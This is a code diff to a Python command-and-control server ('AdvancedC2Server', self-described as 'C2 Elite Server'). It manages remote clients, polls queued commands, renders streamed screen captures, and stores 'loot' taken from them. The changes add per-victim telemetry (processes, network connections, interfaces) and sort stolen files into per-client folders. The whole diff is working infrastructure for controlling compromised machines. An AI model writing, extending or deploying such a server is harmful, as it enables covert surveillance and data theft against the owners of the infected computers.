@@ -115,7 +115,34 @@ class DatabaseManager:
                 is_active BOOLEAN DEFAULT 0
             )
         ''')
-        c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, timestamp TEXT)')
+        c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, size INTEGER DEFAULT 0, timestamp TEXT)')
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS system_info (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                client_id TEXT,
+                cpu_usage FLOAT,
+                memory_usage FLOAT,
+                memory_total FLOAT,
+                disk_usage FLOAT,
+                disk_total FLOAT,
+                network_in FLOAT DEFAULT 0,
+                network_out FLOAT DEFAULT 0,
+                network_interfaces TEXT,
+                running_processes TEXT,
+                network_connections TEXT,
+                uptime FLOAT,
+                timestamp TEXT
+            )
+        ''')
+        
+        # Simple Migrations for existing databases
+        try: c.execute("ALTER TABLE loot ADD COLUMN size INTEGER DEFAULT 0")
+        except: pass
+        try: c.execute("ALTER TABLE system_info ADD COLUMN network_in FLOAT DEFAULT 0")
+        except: pass
+        try: c.execute("ALTER TABLE system_info ADD COLUMN network_out FLOAT DEFAULT 0")
+        except: pass
+
         try:
             c.execute("UPDATE clients SET status = 'offline'")
             c.execute("UPDATE commands SET is_active = 0 WHERE is_active = 1")
@@ -233,8 +260,8 @@ class DatabaseManager:
                 "size": len(data) if data else 0
             })
         else:
-            self.execute("INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?, ?, ?, ?, ?)",
-                        (client_id, l_type, filename, path, ts))
+            self.execute("INSERT INTO loot (client_id, type, filename, path, size, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+                        (client_id, l_type, filename, path, len(data) if data else 0, ts))
 
 class AdvancedC2Server:
     def __init__(self, config: ServerConfig):
@@ -290,7 +317,7 @@ class AdvancedC2Server:
             self.logger.success(f"C2 Elite Server listening on {self.config.host}:{self.config.port}")
             # Very short timeout so the render loop fires at ~200 Hz
             # This is the fix for stream lag: old 1.0s timeout caused up to 1s render stall
-            server_sock.settimeout(0.005)
+            server_sock.settimeout(0.01)
             while self.running:
                 # --- Drain ALL pending screen-stream frames (not just one) ---
                 rendered = False
@@ -351,8 +378,12 @@ class AdvancedC2Server:
                 except socket.timeout:
                     pass
 
-                # --- Poll Database for Commands ---
-                self._poll_database_commands()
+                # --- Poll Database for Commands (Increased frequency) ---
+                if not hasattr(self, '_poll_counter'): self._poll_counter = 0
+                self._poll_counter += 1
+                if self._poll_counter >= 5: # Checked every ~50-100ms
+                    self._poll_counter = 0
+                    self._poll_database_commands()
 
                 # --- Periodic Sync Active Tasks (Every 5 seconds) ---
                 # The loop sleeps for 0.005s in settimeout, but waitKey(1) also adds delay.
@@ -672,9 +703,10 @@ class AdvancedC2Server:
                     m = msg['metrics']
                     self.db.execute("""
                         INSERT INTO system_info (
-                            client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total,
+                            client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total, 
+                            network_in, network_out,
                             network_interfaces, running_processes, network_connections, uptime, timestamp
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                     """, (
                         cid, 
                         m.get('cpu_usage', 0),
@@ -682,6 +714,8 @@ class AdvancedC2Server:
                         m.get('memory_total', 0),
                         m.get('disk_usage', 0),
                         m.get('disk_total', 0),
+                        m.get('network_in', 0),
+                        m.get('network_out', 0),
                         json.dumps(m.get('network_interfaces', {})),
                         json.dumps(m.get('running_processes', [])),
                         str(m.get('network_connections', 0)),
@@ -779,15 +813,20 @@ class AdvancedC2Server:
         except queue.Full:
             pass
 
+    def _save_loot(self, cid, msg):
+        """Handle incoming loot data from client and persist it."""
+        lt = msg.get('loot_type', 'file')
+        fn = msg.get('filename', f"unnamed_{int(time.time())}")
+        
         try:
             data_bytes = base64.b64decode(msg.get('data', ''))
         except:
             data_bytes = str(msg.get('data', '')).encode()
 
-        # If Mongo is not used, save to disk
-        fpath = None
+        fpath_str = None
         if not self.db.use_mongo:
-            path = Path(self.config.loot_dir) / lt
+            # Better loot saving: Organize by client ID
+            path = Path(self.config.loot_dir) / cid / lt
             path.mkdir(parents=True, exist_ok=True)
             fpath = path / fn
             with open(fpath, 'wb') as f: f.write(data_bytes)
